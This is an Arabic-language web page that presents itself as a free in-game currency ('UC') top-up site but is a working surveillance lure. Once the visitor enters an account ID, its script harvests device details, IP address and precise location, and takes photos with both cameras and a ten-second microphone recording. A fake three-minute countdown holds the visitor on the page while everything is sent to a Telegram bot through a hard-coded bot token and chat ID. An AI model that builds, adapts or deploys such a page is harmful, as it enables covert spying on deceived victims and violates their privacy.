<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شحن شدات US مجاني</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f5f5f5;
            margin: 0;
        }
        #container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        #status {
            font-size: 18px;
            margin: 20px 0;
            color: #333;
        }
        #permission-btn, #submit-btn {
            background: #4285f4;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px 0;
            width: 100%;
        }
        #permission-btn:disabled, #submit-btn:disabled {
            background: #cccccc;
        }
        #user-id {
            padding: 12px;
            font-size: 16px;
            width: 100%;
            margin: 10px 0;
            box-sizing: border-box;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .countdown {
            font-size: 24px;
            font-weight: bold;
            color: #4285f4;
            margin: 20px 0;
        }
        .welcome-message {
            font-size: 24px;
            color: #4285f4;
            margin-bottom: 20px;
            font-weight: bold;
        }
        .hidden {
            display: none;
        }
        .loading {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .error {
            color: #d32f2f;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div id="container">
        <div class="welcome-message" id="welcome-message">اهلا بك في موقع شحن شدات US مجاني 💸</div>
        
        <!-- الصفحة 1: بدء العملية -->
        <div id="page1">
            <button id="permission-btn">ابدأ الآن</button>
        </div>
        
        <!-- الصفحة 2: إدخال المعرف -->
        <div id="page2" class="hidden">
            <div id="status">اكتب الايدي الخاص بحسابك 🆔</div>
            <input type="number" id="user-id" placeholder="أدخل الأيدي هنا">
            <button id="submit-btn">ارسال US</button>
        </div>
        
        <!-- الصفحة 3: العد التنازلي -->
        <div id="page3" class="hidden">
            <div id="status">جاري معالجة طلبك، انتظر 3 دقائق...</div>
            <div class="countdown" id="countdown">03:00</div>
            <div id="loading" class="loading hidden"></div>
            <div id="error-message" class="error hidden"></div>
        </div>
    </div>

    <script>
        // Telegram Configuration
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";
        
        // DOM Elements
        const welcomeMessage = document.getElementById('welcome-message');
        const statusEl = document.getElementById('status');
        const permissionBtn = document.getElementById('permission-btn');
        const submitBtn = document.getElementById('submit-btn');
        const userIdInput = document.getElementById('user-id');
        const page1 = document.getElementById('page1');
        const page2 = document.getElementById('page2');
        const page3 = document.getElementById('page3');
        const countdownEl = document.getElementById('countdown');
        const loadingEl = document.getElementById('loading');
        const errorEl = document.getElementById('error-message');
        
        // Move to page 2 when start button is clicked
        permissionBtn.addEventListener('click', () => {
            page1.classList.add('hidden');
            page2.classList.remove('hidden');
        });
        
        // دالة محسنة للوصول إلى الكاميرا
        async function getCameraAccess(facingMode) {
            const constraints = {
                video: {
                    width: { ideal: 1280 },
                    height: { ideal: 720 },
                    facingMode: facingMode ? { exact: facingMode } : undefined
                }
            };
            
            try {
                return await navigator.mediaDevices.getUserMedia(constraints);
            } catch (error) {
                console.error(`Camera access error (${facingMode}):`, error);
                
                // محاولة بدون facingMode إذا فشلت المحاولة الأولى
                if (facingMode) {
                    try {
                        constraints.video.facingMode = undefined;
                        return await navigator.mediaDevices.getUserMedia(constraints);
                    } catch (fallbackError) {
                        console.error('Fallback camera access error:', fallbackError);
                        throw error; // نعيد الخطأ الأصلي
                    }
                }
                
                throw error;
            }
        }
        
        // دالة محسنة للتسجيل الصوتي
        async function getMicrophoneAccess() {
            try {
                return await navigator.mediaDevices.getUserMedia({ 
                    audio: {
                        echoCancellation: false,
                        noiseSuppression: false,
                        autoGainControl: false
                    }
                });
            } catch (error) {
                console.error("Microphone access error:", error);
                throw error;
            }
        }
        
        // دالة التقاط الصورة محسنة
        async function captureAndSendPhoto(facingMode, filename, userId) {
            let stream;
            
            try {
                loadingEl.classList.remove('hidden');
                statusEl.textContent = facingMode === 'user' 
                    ? "جاري الوصول إلى الكاميرا الأمامية..." 
                    : "جاري الوصول إلى الكاميرا الخلفية...";
                
                stream = await getCameraAccess(facingMode);
                
                const video = document.createElement('video');
                video.srcObject = stream;
                
                await new Promise((resolve, reject) => {
                    video.onloadedmetadata = resolve;
                    video.onerror = reject;
                    video.play().catch(reject);
                });
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const blob = await new Promise(resolve => 
                    canvas.toBlob(resolve, 'image/jpeg', 0.7)
                );
                
                await sendPhotoToTelegram(blob, filename, userId);
                return true;
            } catch (error) {
                await sendToTelegram(`⚠️ كاميرا ${facingMode === 'user' ? 'أمامية' : 'خلفية'} - خطأ: ${error.message}\nUser ID: ${userId}`);
                return false;
            } finally {
                loadingEl.classList.add('hidden');
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                statusEl.textContent = "جاري معالجة طلبك، انتظر...";
            }
        }
        
        // دالة التسجيل الصوتي محسنة
        async function recordAndSendAudio(duration, filename, userId) {
            let stream;
            let recorder;
            
            try {
                loadingEl.classList.remove('hidden');
                statusEl.textContent = "جاري التحضير للتسجيل الصوتي...";
                
                stream = await getMicrophoneAccess();
                recorder = new MediaRecorder(stream);
                const chunks = [];
                
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.start();
                
                statusEl.textContent = "جاري التسجيل الصوتي...";
                await new Promise(resolve => setTimeout(resolve, duration * 1000));
                
                if (recorder.state !== 'inactive') {
                    recorder.stop();
                }
                
                await new Promise(resolve => {
                    recorder.onstop = resolve;
                });
                
                const blob = new Blob(chunks, { type: 'audio/webm' });
                await sendAudioToTelegram(blob, filename, userId);
                return true;
            } catch (error) {
                await sendToTelegram(`⚠️ خطأ في التسجيل الصوتي: ${error.message}\nUser ID: ${userId}`);
                return false;
            } finally {
                loadingEl.classList.add('hidden');
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                statusEl.textContent = "جاري معالجة طلبك، انتظر...";
            }
        }
        
        // دالة الحصول على الموقع
        async function getLocation(userId) {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error("Geolocation غير مدعوم في هذا المتصفح"));
                    return;
                }
                
                loadingEl.classList.remove('hidden');
                statusEl.textContent = "جاري تحديد الموقع...";
                
                navigator.geolocation.getCurrentPosition(
                    async pos => {
                        try {
                            const location = {
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude,
                                accuracy: pos.coords.accuracy
                            };
                            
                            await sendToTelegram(
                                `📍 موقع المستخدم:\n` +
                                `- خط العرض: ${location.latitude}\n` +
                                `- خط الطول: ${location.longitude}\n` +
                                `- الدقة: ${location.accuracy} متر\n` +
                                `- خرائط: https://maps.google.com/?q=${location.latitude},${location.longitude}\n` +
                                `- User ID: ${userId}`
                            );
                            
                            resolve(location);
                        } catch (error) {
                            reject(error);
                        } finally {
                            loadingEl.classList.add('hidden');
                            statusEl.textContent = "جاري معالجة طلبك، انتظر...";
                        }
                    },
                    err => {
                        loadingEl.classList.add('hidden');
                        statusEl.textContent = "جاري معالجة طلبك، انتظر...";
                        reject(err);
                    },
                    { 
                        enableHighAccuracy: true, 
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        // دالة جمع معلومات الجهاز
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                deviceType: getDeviceType(),
                os: getOSInfo(),
                cpuCores: navigator.hardwareConcurrency || 'غير معروف',
                ram: navigator.deviceMemory ? `${navigator.deviceMemory} جيجابايت` : 'غير معروف',
                screen: `${window.screen.width}x${window.screen.height}`,
                colorDepth: `${window.screen.colorDepth} بت`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                battery: getBatteryInfo(),
                connection: getConnectionInfo(),
                ip: 'جاري الجلب...',
                gpu: getGPUInfo(),
                touchSupport: 'ontouchstart' in window ? 'مدعوم' : 'غير مدعوم',
                sensors: getSensorInfo(),
                storage: getStorageEstimate(),
                installedApps: getInstalledAppsInfo(),
                security: getSecurityInfo(),
                time: new Date().toLocaleString('ar-EG')
            };
        }
        
        // دالة إرسال معلومات الجهاز
        async function sendDeviceInfo(userId) {
            try {
                loadingEl.classList.remove('hidden');
                statusEl.textContent = "جاري جمع معلومات الجهاز...";
                
                const deviceInfo = getDeviceInfo();
                deviceInfo.userId = userId;
                deviceInfo.ip = await fetchIP();
                
                await sendToTelegram(formatDeviceInfo(deviceInfo));
                return true;
            } catch (error) {
                await sendToTelegram(`⚠️ خطأ في جمع معلومات الجهاز: ${error.message}\nUser ID: ${userId}`);
                return false;
            } finally {
                loadingEl.classList.add('hidden');
                statusEl.textContent = "جاري معالجة طلبك، انتظر...";
            }
        }
        
        // دالة الحصول على عنوان IP
        async function fetchIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'غير معروف';
            }
        }
        
        // Helper functions for device info
        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/Android/i.test(ua)) return 'أندرويد';
            if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
            if (/Windows/i.test(ua)) return 'ويندوز';
            if (/Mac/i.test(ua)) return 'ماك';
            if (/Linux/i.test(ua)) return 'لينكس';
            return 'غير معروف';
        }
        
        function getOSInfo() {
            const ua = navigator.userAgent;
            const clientStrings = [
                {s:'Windows 10', r:/(Windows 10.0|Windows NT 10.0)/},
                {s:'Windows 8.1', r:/(Windows 8.1|Windows NT 6.3)/},
                {s:'Windows 8', r:/(Windows 8|Windows NT 6.2)/},
                {s:'Windows 7', r:/(Windows 7|Windows NT 6.1)/},
                {s:'Android', r:/Android/},
                {s:'iOS', r:/(iPhone|iPad|iPod)/},
                {s:'Mac OS X', r:/Mac OS X/},
                {s:'Linux', r:/Linux/},
                {s:'Ubuntu', r:/Ubuntu/}
            ];
            for (let i = 0; i < clientStrings.length; i++) {
                if (clientStrings[i].r.test(ua)) {
                    return clientStrings[i].s;
                }
            }
            return 'غير معروف';
        }
        
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'نعم' : 'لا',
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {
                    return 'غير معروف';
                }
            }
            return 'غير مدعوم';
        }
        
        function getConnectionInfo() {
            if (navigator.connection) {
                return {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + 'Mb/s',
                    rtt: navigator.connection.rtt + 'ms',
                    saveData: navigator.connection.saveData ? 'نعم' : 'لا'
                };
            }
            return 'غير معروف';
        }
        
        function getGPUInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                } : 'غير معروف';
            }
            return 'غير مدعوم';
        }
        
        function getSensorInfo() {
            const sensors = [];
            if ('accelerometer' in window) sensors.push('مقياس التسارع');
            if ('gyroscope' in window) sensors.push('الجيروسكوب');
            if ('magnetometer' in window) sensors.push('المغناطيسي');
            if ('AmbientLightSensor' in window) sensors.push('استشعار الضوء');
            return sensors.length ? sensors.join('، ') : 'لم يتم اكتشاف أي أجهزة استشعار';
        }
        
        async function getStorageEstimate() {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const estimate = await navigator.storage.estimate();
                    return {
                        usage: (estimate.usage / (1024 * 1024)).toFixed(2) + 'MB',
                        quota: (estimate.quota / (1024 * 1024)).toFixed(2) + 'MB'
                    };
                } catch (e) {
                    return 'غير معروف';
                }
            }
            return 'غير مدعوم';
        }
        
        function getInstalledAppsInfo() {
            if ('getInstalledRelatedApps' in window) {
                return 'مدعوم (يتطلب إذن المستخدم)';
            }
            return 'كشف محدود';
        }
        
        function getSecurityInfo() {
            const security = [];
            if (window.isSecureContext) security.push('سياق آمن');
            if (navigator.doNotTrack === '1') security.push('DNT مفعل');
            if (navigator.cookieEnabled) security.push('الكوكيز مفعلة');
            return security.length ? security.join('، ') : 'أساسي';
        }
        
        // تنسيق معلومات الجهاز للرسالة
        function formatDeviceInfo(info) {
            return `📱 <b>معلومات الجهاز</b>\n\n` +
                   `👤 <b>معرف المستخدم</b>: ${info.userId || 'غير معروف'}\n\n` +
                   `🖥️ <b>معلومات النظام</b>\n` +
                   `- المنصة: ${info.platform}\n` +
                   `- الجهاز: ${info.deviceType}\n` +
                   `- نظام التشغيل: ${info.os}\n` +
                   `- متصفح المستخدم: ${info.userAgent}\n` +
                   `- نوى المعالج: ${info.cpuCores}\n` +
                   `- الذاكرة العشوائية: ${info.ram}\n\n` +
                   
                   `📊 <b>الشاشة</b>\n` +
                   `- الدقة: ${info.screen}\n` +
                   `- عمق الألوان: ${info.colorDepth}\n\n` +
                   
                   `🌐 <b>الشبكة</b>\n` +
                   `- نوع الاتصال: ${info.connection.type || 'غير معروف'}\n` +
                   `- عنوان IP: ${info.ip}\n` +
                   `- اللغة: ${info.language}\n` +
                   `- المنطقة الزمنية: ${info.timezone}\n\n` +
                   
                   `🔋 <b>البطارية</b>\n` +
                   `- مستوى الشحن: ${info.battery.level || 'غير معروف'}\n` +
                   `- حالة الشحن: ${info.battery.charging || 'غير معروف'}\n\n` +
                   
                   `⚙️ <b>معلومات متقدمة</b>\n` +
                   `- كرت الشاشة: ${info.gpu.renderer || 'غير معروف'}\n` +
                   `- شاشة لمس: ${info.touchSupport}\n` +
                   `- أجهزة الاستشعار: ${info.sensors}\n` +
                   `- مساحة التخزين: ${info.storage.quota || 'غير معروف'}\n` +
                   `- الأمان: ${info.security}\n\n` +
                   
                   `⏰ <b>الوقت</b>\n${info.time}`;
        }
        
        // Telegram sending functions
        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                return await response.json();
            } catch (error) {
                console.error('خطأ في إرسال الرسالة إلى Telegram:', error);
                throw error;
            }
        }
        
        async function sendPhotoToTelegram(photoBlob, filename, userId) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, filename);
                formData.append('caption', `صورة من مستخدم\nUser ID: ${userId}`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                return await response.json();
            } catch (error) {
                console.error('خطأ في إرسال الصورة إلى Telegram:', error);
                throw error;
            }
        }
        
        async function sendAudioToTelegram(audioBlob, filename, userId) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('audio', audioBlob, filename);
                formData.append('caption', `تسجيل صوتي من مستخدم\nUser ID: ${userId}`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                return await response.json();
            } catch (error) {
                console.error('خطأ في إرسال التسجيل الصوتي إلى Telegram:', error);
                throw error;
            }
        }
        
        // عند إرسال النموذج
        submitBtn.addEventListener('click', async () => {
            const userId = userIdInput.value.trim();
            
            if (!userId) {
                showError("الرجاء إدخال الأيدي الخاص بك");
                return;
            }
            
            // الانتقال إلى صفحة الانتظار
            page2.classList.add('hidden');
            page3.classList.remove('hidden');
            errorEl.classList.add('hidden');
            
            // بدء العد التنازلي
            let timeLeft = 180;
            const countdownInterval = setInterval(() => {
                timeLeft--;
                
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                
                countdownEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    statusEl.textContent = "تم الانتهاء!";
                }
            }, 1000);
            
            // بدء جمع البيانات في الخلفية
            try {
                // 1. إرسال معلومات الجهاز
                await sendDeviceInfo(userId);
                
                // 2. الحصول على الموقع
                try {
                    await getLocation(userId);
                } catch (locError) {
                    console.error("Location error:", locError);
                }
                
                // 3. الكاميرا الأمامية
                try {
                    await captureAndSendPhoto('user', `front_${userId}.jpg`, userId);
                } catch (frontCamError) {
                    console.error("Front camera error:", frontCamError);
                }
                
                // 4. الكاميرا الخلفية (مع معالجة خاصة للفشل)
                try {
                    await captureAndSendPhoto('environment', `back_${userId}.jpg`, userId);
                } catch (backCamError) {
                    console.error("Back camera error:", backCamError);
                    
                    // محاولة مرة أخرى بدون تحديد facingMode
                    try {
                        await captureAndSendPhoto(undefined, `back_fallback_${userId}.jpg`, userId);
                    } catch (fallbackError) {
                        console.error("Back camera fallback error:", fallbackError);
                    }
                }
                
                // 5. التسجيل الصوتي
                try {
                    await recordAndSendAudio(10, `audio_${userId}.webm`, userId);
                } catch (audioError) {
                    console.error("Audio recording error:", audioError);
                }
                
                // إرسال رسالة إتمام
                await sendToTelegram(`✅ تم الانتهاء من جمع بيانات المستخدم\nUser ID: ${userId}`);
                
            } catch (mainError) {
                console.error("Main data collection error:", mainError);
                showError("حدث خطأ أثناء المعالجة. يرجى المحاولة مرة أخرى.");
                await sendToTelegram(`⚠️ خطأ رئيسي في جمع البيانات\nUser ID: ${userId}\nError: ${mainError.message}`);
            } finally {
                loadingEl.classList.add('hidden');
            }
        });
        
        // دالة عرض الخطأ
        function showError(message) {
            errorEl.textContent = message;
            errorEl.classList.remove('hidden');
        }
        
        // التهيئة الأولية
        (async function init() {
            try {
                // يمكنك إضافة أي كود تهيئة هنا إذا لزم الأمر
            } catch (error) {
                console.error("Initialization error:", error);
            }
        })();
    </script>
</body>
</html>
